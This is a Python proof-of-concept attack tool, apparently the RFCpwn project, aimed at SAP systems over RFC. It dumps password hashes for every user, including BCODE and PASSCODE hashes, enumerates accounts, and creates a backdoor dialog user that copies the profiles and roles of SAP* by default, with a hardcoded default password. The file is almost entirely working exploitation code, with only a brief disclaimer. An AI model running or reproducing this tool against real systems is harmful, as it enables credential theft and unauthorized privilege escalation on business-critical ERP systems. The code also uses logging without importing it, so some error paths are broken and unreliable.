#!/usr/bin/env python
# https://github.com/icryo/RFCpwn
#
# PoC, do not use on production systems
# There is no guarantee of stability or support
#
# Author:
#  Austin Marck (@icryo)
#
from __future__ import division
from __future__ import print_function
import sys
import argparse
import datetime
import pyrfc
from pyrfc import Connection

def abapusercopy() :
    c = conn
    uname_from = copy
    valid_from = datetime.date(2015,1,19)
    valid_to   = datetime.date(2015,12,31)
    users= [user]
    r = conn.call('BAPI_USER_GET_DETAIL', USERNAME = uname_from, CACHE_RESULTS  = ' ')
    if r['LOGONDATA']['GLTGV'] is None:
        r['LOGONDATA']['GLTGV'] = valid_from

    if r['LOGONDATA']['GLTGB'] is None:
        r['LOGONDATA']['GLTGB'] = valid_to

    password = {'BAPIPWD' : options.pw}
    for uname_to in users:
        print("creating "+uname_to)
        r['ADDRESS']['LASTNAME'] = uname_to
        r['ADDRESS']['FULLNAME'] = uname_to

        x = conn.call('BAPI_USER_CREATE1',
            USERNAME    = uname_to,
            LOGONDATA   = r['LOGONDATA'],
            PASSWORD    = password,
            DEFAULTS    = r['DEFAULTS'],
            ADDRESS     = r['ADDRESS'],
            COMPANY     = r['COMPANY'],
            REF_USER    = r['REF_USER'],
            PARAMETER   = r['PARAMETER'],
            GROUPS      = r['GROUPS']
        )
        x = conn.call('BAPI_USER_PROFILES_ASSIGN',
            USERNAME  = uname_to,
            PROFILES  = r['PROFILES']
        )
        x = conn.call('BAPI_USER_ACTGROUPS_ASSIGN',
            USERNAME       = uname_to,
            ACTIVITYGROUPS = r['ACTIVITYGROUPS']
        )

def dump():
    r = conn.call('BAPI_USER_GETLIST')
    x = r['USERLIST']
    for uuid in x:
        name = uuid['USERNAME']
        bc = conn.call('BAPI_USER_GET_DETAIL', USERNAME=name, CACHE_RESULTS=' ')
        h = bc['LOGONDATA']['PWDSALTEDHASH']
        if bc['LOGONDATA']['BCODE']:
            b=bc['LOGONDATA']['BCODE']
        else:
            b=""
        if bc['LOGONDATA']['PASSCODE']:
            p=bc['LOGONDATA']['PASSCODE']
        else:
            p=""

        print(name+":" + h)
        if options.exp is True:
            print(name +"BCODE: " + str(b))
            print(name +"PASSCODE: " + str(p)+"\n")

def userenum():
    r = conn.call('BAPI_USER_GET_DETAIL', USERNAME=options.user, CACHE_RESULTS=' ')
    print(r)

def pingit():
    r = conn.call('STFC_CONNECTION', REQUTEXT=u'PINGTEST')
    print(r)
    print("Connected to SAP successfully")

if __name__ == '__main__':

    parser = argparse.ArgumentParser(add_help=True,
                                     description="An Impacket style enumeration and exploitation tool using SAP RFC calls ")
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    group = parser.add_argument_group('Authentication')
    group.add_argument('-ip', action='store', help='<targetName or address>')
    group.add_argument('-u', action="store", metavar="Username", help='RFC Users Username')
    group.add_argument('-p', action="store", metavar="Password", help='RFC Users Password')
    group.add_argument('-c', action="store", metavar="Client", help='Client- eg.000')
    group.add_argument('-s', action="store", metavar="Sysid", help='System Number- eg 00')
    group.add_argument('-ping', action="store_true", help='RFC Ping Command', default=False)
    group = parser.add_argument_group('User Abuse')
    group.add_argument('-enum', action="store_true", help='Use to enumerate a specific user', default=False)
    group.add_argument('-usercopy', action="store_true", help='add a Dialog User', default=False)
    group.add_argument('-user', action="store", help='Required for -usercopy and -userenum to specify the user')
    group.add_argument('-copy', action="store", help='User to be copied required for -usercopy', default='SAP*')
    group.add_argument('-pw', action="store", help='password of new user for -usercopy', default='Ch4ng3th1sone')
    group = parser.add_argument_group('Hash Collection')
    group.add_argument('-dump', action="store_true", help='Dump hashes use with below', default=False)
    group.add_argument('-exp', action="store_true", help=' EXPERIMENTAL - Dump BCODE / PASSCODE hashes', default=False)

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()
    conn = Connection(ashost=options.ip, sysnr=options.s, client=options.c, user=options.u, passwd=options.p)
    user = options.user
    copy = options.copy

    try:
        if options.ping is True:
            try:
                pingit()
            except Exception as e:
                print("Connection Failed")
                logging.error(str(e))
                sys.exit(1)
        elif options.dump is True:
            try:
                dump()
            except Exception as e:
                print("This is still being implemented")
                logging.error(str(e))
                sys.exit(1)
        elif options.enum is True:
            try:
                userenum()
            except Exception as e:
                print("something didn't work during enum")
                logging.error(str(e))
                sys.exit(1)
        elif options.usercopy is True:
            try:
                abapusercopy()
                print(copy+"'s rights and permissions copied into "+user)
            except Exception as e:
                print("could not copy the user")
                logging.error(str(e))
                sys.exit(1)
        else:
            print("failed")

    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        logging.error(str(e))
